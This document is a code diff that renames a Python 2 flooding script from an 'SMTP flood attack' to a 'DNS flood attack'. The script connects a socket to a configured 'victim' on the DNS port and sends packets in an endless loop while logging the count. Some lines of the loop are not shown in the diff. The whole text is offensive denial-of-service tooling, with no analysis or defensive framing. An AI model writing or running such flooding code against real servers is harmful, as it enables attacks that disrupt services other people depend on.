@@ -1,10 +1,9 @@
 """
-This script implements SMTP flood attack.
+This script implements DNS flood attack.
 """
 
 import socket
 import time
-
 from .. import configs
 
 # GLOBALS
@@ -12,13 +11,13 @@ sent = 0
 
 
 # ATTACK
-def smtp_flood():
+def dns_flood():
     global sent
     duration = 0
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(10)
-    sock.connect((configs.victim, configs.SMTP_PORT))
+    sock.connect((configs.victim, configs.DNS_PORT))
 
     while True:
         # send packet
@@ -29,7 +28,7 @@ def smtp_flood():
 
         # print log
         print "%s packets were sent to %s:%s. interval time: %s, send interval: %s" % (
-            sent, configs.victim, configs.SMTP_PORT, duration, configs.send_interval)
+            sent, configs.victim, configs.DNS_PORT, duration, configs.send_interval)
 
         # sleep for send_interval secs
         time.sleep(configs.send_interval)
@@ -49,4 +48,4 @@ def smtp_flood():
 
 
 if __name__ == '__main__':
-    smtp_flood()
+    dns_flood()
